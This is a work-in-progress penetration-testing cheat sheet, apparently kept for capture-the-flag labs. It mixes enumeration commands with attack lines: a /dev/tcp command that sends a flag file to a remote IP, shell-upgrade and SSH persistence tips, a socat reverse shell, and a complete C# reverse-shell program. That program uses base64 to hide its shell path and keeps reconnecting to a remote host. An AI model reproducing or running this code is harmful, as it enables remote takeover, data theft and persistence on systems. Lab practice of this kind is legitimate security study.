# WIP

netstat -lnpu

netstat -tulpn

chmod 600 op id_rsa

nmap -sV -A $IP

https://www.revshells.com/

ps -aux; ps -axjf

ps -C <process name>

ps -T; from terminal



find . -perm /4000 
cat /opt/flag.txt > /dev/tcp/10.10.14.8/4445
python3 -c 'import pty; pty.spawn("/bin/bash")'


ssh persistence -> id_rsa.pub into 	~/.ssh/authorized_keys

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Multi_OS_ReverseShell
{
    public class Server
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        public bool IsLinux
        {
            get
            {
                int p = (int)Environment.OSVersion.Platform;
                return (p == 4) || (p == 6) || (p == 128);
            }
        }

        public void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect("10.10.14.8", 4449);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception error) { return; }

                processCmd = new Process();
                if (IsLinux)
                {
                    //processCmd.StartInfo.FileName = "/bin/bash";
                    processCmd.StartInfo.FileName = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("L2Jpbi9iYXNo"));
                }
                else
                {
                    //processCmd.StartInfo.FileName = "cmd.exe";
                    processCmd.StartInfo.FileName = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("Y21kLmV4ZQ=="));
                }
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
                processCmd.BeginErrorReadLine();
            }
            IPAddress[] localIPs = Dns.GetHostAddresses(Dns.GetHostName());
            streamWriter.WriteLine("\n--[ Multi-OS ReverseShell ]---------------\n");
            streamWriter.WriteLine(" USER\t" + System.Environment.UserName + "\n LOCAL\t" + System.Environment.MachineName + "\n OS\t" + System.Environment.OSVersion);
            streamWriter.Write(" IPs\t");
            foreach (IPAddress addr in localIPs)
            {
                if (addr.AddressFamily == AddressFamily.InterNetwork)
                {
                    streamWriter.Write(addr + "  ");
                }
            }
            streamWriter.WriteLine("\n\n------------------------------------------\n");
            streamWriter.Flush();
            processCmd.StandardInput.WriteLine(" ");

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception error)
                {
                    Cleanup();
                    break;
                }
            }

        }

        public void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception error) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        public void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        public void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception error) { }

            }
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            Server Actual = new Server();
            for (;;)
            {
                Actual.RunServer();
                System.Threading.Thread.Sleep(3000);
            }
        }
    }
}
```

<https://stackoverflow.com/questions/9059026/php-check-if-file-contains-a-string>

```bash
socat file:$(tty),raw,echo=0 tcp-listen:4455
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.8:4455
```

nmap
-sC common scripts
-p- all ports
